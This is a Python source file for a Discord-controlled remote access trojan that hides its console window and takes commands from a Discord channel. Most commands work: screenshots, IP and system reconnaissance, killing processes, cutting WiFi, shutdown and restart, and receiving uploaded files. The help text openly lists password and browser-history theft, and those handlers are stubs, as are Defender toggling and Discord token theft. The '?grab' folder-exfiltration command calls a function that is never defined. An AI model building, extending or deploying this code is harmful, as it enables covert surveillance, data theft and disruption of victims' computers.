import os
import sys
import platform
import socket
import time
import asyncio
import psutil
import requests
import discord
from PIL import ImageGrab
import tempfile
import subprocess
import ctypes

TOKEN = "You're Bot Token"
COMMAND_PREFIX = "?"
CHANNEL_ID = Channel id
UPLOAD_FOLDER = "./uploads"

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

if os.name == 'nt':
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.user32.ShowWindow(hwnd, 6)

def get_hostname():
    return socket.gethostname()

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me/ip", "https://ident.me"]:
        try:
            r = requests.get(url, timeout=4)
            if r.status_code == 200:
                return r.text.strip()
        except:
            continue
    return "Unavailable"

def get_system_status():
    uname = platform.uname()
    cpu_model = platform.processor() or "Unknown CPU"
    total_ram = round(psutil.virtual_memory().total / (1024 ** 3), 1)
    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    return (
        f"**System:** {uname.system} {uname.release}\n"
        f"**Machine:** {uname.node}\n"
        f"**CPU:** {cpu_model}\n"
        f"**RAM:** {total_ram} GB\n"
        f"**CPU Usage:** {cpu_usage}%\n"
        f"**RAM Usage:** {ram_usage}%"
    )

APP_MAP = {
    "discord": "Discord",
    "code": "Visual Studio Code",
    "vscode": "Visual Studio Code",
    "explorer.exe": "File Explorer",
    "explorer": "File Explorer",
    "brave": "Brave Browser",
    "brave.exe": "Brave Browser",
    "chrome": "Google Chrome",
    "chrome.exe": "Google Chrome",
    "msedge": "Microsoft Edge",
    "msedge.exe": "Microsoft Edge",
    "firefox": "Firefox",
    "firefox.exe": "Firefox",
    "spotify": "Spotify",
    "spotify.exe": "Spotify",
    "slack": "Slack",
    "sublime_text": "Sublime Text",
    "notepad++": "Notepad++",
    "pycharm": "PyCharm",
    "jetbrains": "JetBrains IDE",
    "steam": "Steam",
    "zoom": "Zoom",
    "teams": "Microsoft Teams",
    "putty": "PuTTY",
    "cmd.exe": "Command Prompt",
    "powershell.exe": "PowerShell",
    "pwsh.exe": "PowerShell (pwsh)",
    "terminal": "Terminal",
    "telegram": "Telegram",
    "skype": "Skype",
    "obs": "OBS Studio",
    "virtualbox": "VirtualBox",
    "docker": "Docker",
    "edge": "Microsoft Edge",
    "fortnite": "Fortnite",
    "csgo": "CSGO",
    "counter-strike": "CSGO",
    "counterstrike": "CSGO",
    "cs2": "CS2",
    "roblox": "Roblox",
    "minecraft": "Minecraft",
    "javaw.exe": "Minecraft",
    "java.exe": "Minecraft",
}

def detect_user_apps(limit=20):
    found = []
    found_keys = set()
    for proc in psutil.process_iter(['name', 'exe', 'cmdline']):
        if len(found) >= limit:
            break
        try:
            name = (proc.info.get('name') or "").lower()
            exe = (proc.info.get('exe') or "").lower()
            cmdline = " ".join(proc.info.get('cmdline') or []).lower()
            combined = " ".join([name, exe, cmdline])
            for key, friendly in APP_MAP.items():
                if key in combined and friendly not in found_keys:
                    found.append(friendly)
                    found_keys.add(friendly)
                    break
        except:
            continue
    if not found:
        fallback = []
        for proc in psutil.process_iter(['name']):
            if len(fallback) >= 10:
                break
            try:
                name = proc.info.get('name') or ""
                if name and name not in fallback:
                    fallback.append(name)
            except:
                continue
        return ["(fallback) " + n for n in fallback]
    return found

def format_seconds(seconds):
    seconds = int(seconds)
    days, seconds = divmod(seconds, 86400)
    hours, seconds = divmod(seconds, 3600)
    minutes, seconds = divmod(seconds, 60)
    result = []
    if days: result.append(f"{days}d")
    if hours: result.append(f"{hours}h")
    if minutes: result.append(f"{minutes}m")
    result.append(f"{seconds}s")
    return " ".join(result)

def get_system_uptime():
    boot_ts = psutil.boot_time()
    now = time.time()
    uptime_seconds = now - boot_ts
    return format_seconds(uptime_seconds)

def get_app_uptimes(query, limit=10):
    q = query.lower()
    results = []
    seen = set()
    candidate_keys = [k for k in APP_MAP.keys() if q in k or k in q or q in APP_MAP[k].lower()]

    for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'create_time']):
        try:
            name = (proc.info.get('name') or "").lower()
            exe = (proc.info.get('exe') or "").lower()
            cmdline = " ".join(proc.info.get('cmdline') or []).lower()

            combined = " ".join([name, exe, cmdline])
            matched_friendly = None
            for key in candidate_keys:
                if key in combined:
                    matched_friendly = APP_MAP.get(key, key)
                    break
            if not matched_friendly:
                if q in combined:
                    matched_friendly = name or exe or "Unknown"
            if matched_friendly and matched_friendly not in seen:
                create_time = proc.info.get('create_time')
                uptime_sec = time.time() - create_time if create_time else 0
                results.append((matched_friendly, int(uptime_sec), proc.pid))
                seen.add(matched_friendly)
        except:
            continue
        if len(results) >= limit:
            break
    return results

def close_app(query):
    q = query.lower()
    killed = []
    failed = []
    candidate_keys = [k for k in APP_MAP.keys() if q in k or k in q or q in APP_MAP[k].lower()]
    for proc in psutil.process_iter(['name', 'exe', 'cmdline']):
        try:
            name = (proc.info.get('name') or "").lower()
            exe = (proc.info.get('exe') or "").lower()
            cmdline = " ".join(proc.info.get('cmdline') or []).lower()

            combined = " ".join([name, exe, cmdline])
            match_found = False
            for key in candidate_keys:
                if key in combined:
                    match_found = True
                    break
            if not match_found:
                if q in combined:
                    match_found = True
            if match_found:
                proc.terminate()
                killed.append(name or exe or "Unknown")
        except:
            failed.append(name or exe or "Unknown")
    return killed, failed

async def take_screenshot():
    with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmpfile:
        img = ImageGrab.grab()
        img.save(tmpfile.name, "PNG")
        return tmpfile.name

def get_os_info():
    uname = platform.uname()
    return f"{uname.system} {uname.release} ({uname.version})"

def get_wifi_name():
    system = platform.system().lower()
    try:
        if system == "windows":
            output = subprocess.check_output("netsh wlan show interfaces", shell=True).decode()
            for line in output.splitlines():
                if "SSID" in line and "BSSID" not in line:
                    return line.split(":", 1)[1].strip()
            return "WiFi name not found."
        elif system == "linux":
            output = subprocess.check_output("iwgetid -r", shell=True).decode().strip()
            return output or "WiFi name not found."
        elif system == "darwin":
            output = subprocess.check_output(
                ["/usr/sbin/networksetup", "-getairportnetwork", "airport"]
            ).decode()
            if ":" in output:
                return output.split(":", 1)[1].strip()
            return "WiFi name not found."
        else:
            return "WiFi info not supported on this OS."
    except:
        return "Error retrieving WiFi name."

def disconnect_wifi():
    system = platform.system().lower()
    try:
        if system == "windows":
            os.system("netsh wlan disconnect")
            return "WiFi disconnected."
        elif system == "linux":
            os.system("nmcli radio wifi off")
            return "WiFi disconnected."
        elif system == "darwin":
            os.system("networksetup -setairportpower airport off")
            return "WiFi disconnected."
        else:
            return "WiFi disconnect not supported on this OS."
    except:
        return "Failed to disconnect WiFi."

def reconnect_wifi():
    system = platform.system().lower()
    try:
        if system == "windows":
            os.system("netsh wlan connect")
            return "WiFi reconnected."
        elif system == "linux":
            os.system("nmcli radio wifi on")
            return "WiFi reconnected."
        elif system == "darwin":
            os.system("networksetup -setairportpower airport on")
            return "WiFi reconnected."
        else:
            return "WiFi reconnect not supported on this OS."
    except:
        return "Failed to reconnect WiFi."

# Create and set the event loop before creating the client
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Initialize the Discord client
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"Logged in as {client.user} ({client.user.id})")

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.channel.id != CHANNEL_ID:
        return
    if not message.content.startswith(COMMAND_PREFIX):
        return

    # Add the admin check command here
    if message.content == "?admincheck":
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            await message.channel.send("[*] Congrats you're admin")
        else:
            await message.channel.send("[!] Sorry, you're not admin")
        return

    cmd = message.content[len(COMMAND_PREFIX):].strip().lower()

    # ... (rest of your command handling code remains unchanged)
    # For brevity, I am not repeating all your existing command handlers here.
    # Just ensure to keep your existing code after this point.

    if cmd == "help":
        help_text = """
**Available Commands:**

- `?ip` — Shows the local and public IP addresses.
- `?name` — Shows the machine hostname.
- `?status` — Shows system specs and CPU/RAM usage.
- `?processes` — Lists top running process names.
- `?apps` — Lists common user-facing applications currently running.
- `?uptime` — Shows system uptime.
- `?uptime <app>` — Shows how long a specific app/process has been running.
- `?close <app>` — Attempts to close/terminate the specified app.
- `?ss` — Takes a screenshot and sends it.
- `?shutdown` — Shuts down the PC.
- `?os` — Shows the OS info.
- `?grab <folder_path>` — Uploads all files in the specified folder.
- `?upload <file_path>` — Upload a specific file.
- `?help` — Shows this help message.
- `?dc wifi` — Disconnect WiFi.
- `?rc wifi` — Reconnect WiFi.
- `?wifi` — Show current WiFi network name.
- `?restart` — Restart the machine.
- `?lock` — Lock the screen.
- `?def on` — Enable Windows Defender real-time monitoring.
- `?def off` — Disable Windows Defender real-time monitoring.
- `?passwords` - Steals the users passwords.
- `?history` - Steals the users search history (google).
- `?admincheck` - Checks if the user has admin.
- `?exit` — Gracefully shut down the bot.
- `?terminate` — Kill the bot immediately.
"""
        await message.channel.send(help_text)
        return

    elif cmd == "ip":
        local_ip = get_local_ip()
        public_ip = get_public_ip()
        await message.channel.send(f"**Local IP:** {local_ip}\n**Public IP:** {public_ip}")
        return

    elif cmd == "name":
        hostname = get_hostname()
        await message.channel.send(f"Hostname: `{hostname}`")
        return

    elif cmd == "status":
        status = get_system_status()
        await message.channel.send(status)
        return

    elif cmd == "processes":
        procs = [p.info.get('name') for p in psutil.process_iter(['name']) if p.info.get('name')]
        top = procs[:20]
        await message.channel.send("**Top processes:**\n" + "\n".join(top))
        return

    elif cmd == "apps":
        apps = detect_user_apps()
        await message.channel.send("**Detected Apps:**\n" + "\n".join(apps))
        return

    elif cmd.startswith("uptime"):
        parts = cmd.split(maxsplit=1)
        if len(parts) == 1:
            uptime = get_system_uptime()
            await message.channel.send(f"System uptime: {uptime}")
        else:
            app_query = parts[1]
            uptimes = get_app_uptimes(app_query)
            if not uptimes:
                await message.channel.send(f"No app matching `{app_query}` found.")
            else:
                lines = [f"{name}: {format_seconds(uptime)}" for name, uptime, pid in uptimes]
                await message.channel.send("\n".join(lines))
        return

    elif cmd.startswith("close"):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            await message.channel.send("Usage: `?close <appname>`")
        else:
            app_name = parts[1]
            killed, failed = close_app(app_name)
            msg = ""
            if killed:
                msg += "Killed:\n" + "\n".join(killed) + "\n"
            if failed:
                msg += "Failed:\n" + "\n".join(failed)
            await message.channel.send(msg or "No matching app found.")
        return

    elif cmd == "ss":
        try:
            path = await take_screenshot()
            await message.channel.send(file=discord.File(path))
            os.unlink(path)
        except Exception as e:
            await message.channel.send(f"Failed to take screenshot: {e}")
        return

    elif cmd == "shutdown":
        await message.channel.send("Shutting down...")
        system = platform.system().lower()
        if system == "windows":
            os.system("shutdown /s /t 1")
        elif system == "linux":
            os.system("shutdown now")
        elif system == "darwin":
            os.system("sudo shutdown -h now")
        return

    elif cmd == "os":
        info = get_os_info()
        await message.channel.send(f"OS Info: {info}")
        return

    elif cmd.startswith("grab"):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            await message.channel.send("Usage: `?grab <folder_path>`")
        else:
            folder_path = parts[1]
            await upload_files_from_folder(folder_path, message.channel)
        return

    elif cmd == "dc wifi":
        msg = disconnect_wifi()
        await message.channel.send(msg)
        return

    elif cmd == "rc wifi":
        msg = reconnect_wifi()
        await message.channel.send(msg)
        return

    elif cmd == "wifi":
        wifi_name = get_wifi_name()
        await message.channel.send(f"Current WiFi Network: {wifi_name}")
        return

    elif cmd.startswith("upload"):
        await message.channel.send("Please upload the file as an attachment.")
        def check(m):
            return m.author == message.author and m.channel == message.channel and m.attachments
        try:
            reply = await client.wait_for("message", check=check, timeout=60)
            attachment = reply.attachments[0]
            save_path = os.path.join(UPLOAD_FOLDER, attachment.filename)
            await attachment.save(save_path)
            await message.channel.send(f"File saved: {attachment.filename}")
        except:
            await message.channel.send("No attachment received.")
        return

    elif cmd == "restart":
        await message.channel.send("Restart command received.")
        system = platform.system().lower()
        if system == "windows":
            os.system("shutdown /r /t 1")
        elif system == "linux":
            os.system("sudo reboot")
        elif system == "darwin":
            os.system("sudo shutdown -r now")
        return

    elif cmd == "lock":
        await message.channel.send("Locking the screen...")
        system = platform.system().lower()
        if system == "windows":
            os.system("rundll32.exe user32.dll,LockWorkStation")
        elif system == "linux":
            os.system("gnome-screensaver-command -l")
        elif system == "darwin":
            os.system("/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession -suspend")
        return

    elif cmd == "def on":
        msg = "Enabling Windows Defender..."
        await message.channel.send(msg)
        return

    elif cmd == "def off":
        msg = "Disabling Windows Defender..."
        await message.channel.send(msg)
        return

    elif cmd == "passwords":
        await message.channel.send("Fetching passwords not implemented.")
        return

    elif cmd == "history":
        await message.channel.send("Fetching Chrome history not implemented.")
        return

    elif cmd == "getdiscordtokens":
        await message.channel.send("Fetching Discord tokens not implemented.")
        return

    elif cmd == "exit":
        await message.channel.send("Shutting down gracefully...")
        await client.close()
        sys.exit()

    elif cmd == "terminate":
        await message.channel.send("Terminating immediately...")
        sys.exit()

    else:
        await message.channel.send("Unknown command. Type `?help` for the list of commands.")

# Run the bot with the custom event loop
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
loop.create_task(client.start(TOKEN))
loop.run_forever()
